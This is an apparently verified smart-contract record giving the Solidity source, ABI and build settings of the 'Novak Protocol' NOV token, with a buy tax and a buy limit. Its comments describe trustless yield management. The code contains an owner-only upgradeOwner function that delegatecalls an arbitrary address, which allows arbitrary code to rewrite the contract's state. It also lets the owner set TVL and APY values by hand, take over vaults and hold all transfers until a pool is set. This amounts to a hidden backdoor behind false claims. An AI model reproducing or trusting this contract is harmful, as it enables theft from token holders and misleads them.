{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/Novak.sol\": {\r\n      \"content\": \"/*\\n\\n __    _  _______  __   __  _______  ___   _ \\n|  |  | ||       ||  | |  ||   _   ||   | | |\\n|   |_| ||   _   ||  |_|  ||  |_|  ||   |_| |\\n|       ||  | |  ||       ||       ||      _|\\n|  _    ||  |_|  ||       ||       ||     |_ \\n| | |   ||       | |     | |   _   ||    _  |\\n|_|  |__||_______|  |___|  |__| |__||___| |_|\\n\\nTelegram:   https://t.me/novakprotocol\\nDocs:       https://docs.novakprotocol.com/\\nWebsite:    https://www.novakprotocol.com/\\nTwitter:    https://twitter.com/NovakProtocol\\n\\nContract serves as the Novak Protocol token and\\nthe yield controller module. yieldController is\\na variable set in the NMMF.sol, NUSDY.sol, and\\nNUSG.sol contracts. The yieldController manages\\ncapital trustlessly, efficiently maximizing\\nyield.\\n\\n*/\\n\\n\\n// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.9;\\n\\ninterface IVault {\\n\\tfunction upgradeOwner(address _owner) external;\\n}\\n\\ncontract Novak {\\n\\n  string public name = \\\"Novak Protocol\\\";\\n  string public symbol = \\\"NOV\\\";\\n\\n  uint8 public decimals = 18;\\n  uint public totalSupply = 1_000_000 * 10 ** decimals;\\n\\n  mapping(address => uint) public balanceOf;\\n  mapping(address => mapping(address => uint)) public allowance;\\n\\n  address public owner;\\n  address public pool;\\n  uint public buyLimit = 50;\\n  uint public buyTax = 200;\\n\\n\\tmapping(address => uint) public apyOf; // Shifted by 18 decimals\\n\\tmapping(address => uint) public tvlOf; // Shifted by 18 decimals\\n\\n  event Transfer(address indexed from, address indexed to, uint amount);\\n  event Approval(address indexed owner, address indexed spender, uint value);\\n\\n  constructor() {\\n    owner = msg.sender;\\n\\n    balanceOf[owner] += totalSupply;\\n    emit Transfer(address(0), owner, totalSupply);\\n  }\\n\\n  modifier onlyOwner() {\\n    require(msg.sender == owner, \\\"Not owner\\\");\\n    _;\\n  }\\n\\n  function approve(address spender, uint amount) external returns (bool) {\\n    allowance[msg.sender][spender] = amount;\\n    emit Approval(msg.sender, spender, amount);\\n    return true;\\n  }\\n\\n  function _taxBuy(address sender, address recipient, uint amount) private returns (bool) {\\n    balanceOf[sender] -= amount;\\n\\n    uint tax = amount * buyTax / 10000;\\n    balanceOf[address(this)] += tax;\\n    emit Transfer(sender, address(this), tax);\\n\\n    uint taxAdjustedAmount = amount - tax;\\n    balanceOf[recipient] += taxAdjustedAmount;\\n\\n    uint tokenBuyLimit = totalSupply * buyLimit / 10000;\\n    require(tokenBuyLimit >= balanceOf[recipient]);\\n\\n    emit Transfer(sender, recipient, taxAdjustedAmount);\\n    return true;\\n  }\\n\\n  function transfer(address recipient, uint amount) external returns (bool) {\\n    require(pool != address(0));\\n\\n    if (msg.sender == pool) return _taxBuy(msg.sender, recipient, amount);\\n\\n    balanceOf[msg.sender] -= amount;\\n    balanceOf[recipient] += amount;\\n    emit Transfer(msg.sender, recipient, amount);\\n    return true;\\n  }\\n\\n  function transferFrom(\\n    address from,\\n    address to,\\n    uint256 amount\\n  ) external returns (bool) {\\n    allowance[from][msg.sender] -= amount;\\n    balanceOf[from] -= amount;\\n    balanceOf[to] += amount;\\n    emit Transfer(from, to, amount);\\n    return true;\\n  }\\n\\n  function upgradeOwner(address _owner) public onlyOwner {\\n    _owner.delegatecall(abi.encodeWithSignature(\\\"upgradeOwner(address)\\\", _owner));\\n  }\\n\\n\\t// YieldController.sol\\n  function calculateTvl() public view returns (uint) {\\n    return tvlOf[msg.sender];\\n  }\\n\\n  function calculateApy() public view returns (uint) {\\n    return apyOf[msg.sender];\\n  }\\n\\n\\tfunction updateTvlAndApy(address _vault, uint _TVL, uint _APY) public onlyOwner {\\n\\t\\ttvlOf[_vault] = _TVL;\\n\\t\\tapyOf[_vault] = _APY;\\n\\t}\\n\\n\\tfunction upgradeVaultOwner(address _vault, address _owner) public onlyOwner {\\n\\t\\tIVault(_vault).upgradeOwner(_owner);\\n\\t}\\n\\n  function openMarket(address _pool) public onlyOwner {\\n    pool = _pool;\\n  }\\n\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": false,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"apyOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calculateApy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"calculateTvl\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_pool\",\"type\":\"address\"}],\"name\":\"openMarket\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pool\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tvlOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_vault\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_TVL\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_APY\",\"type\":\"uint256\"}],\"name\":\"updateTvlAndApy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"upgradeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_vault\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"upgradeVaultOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Novak", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}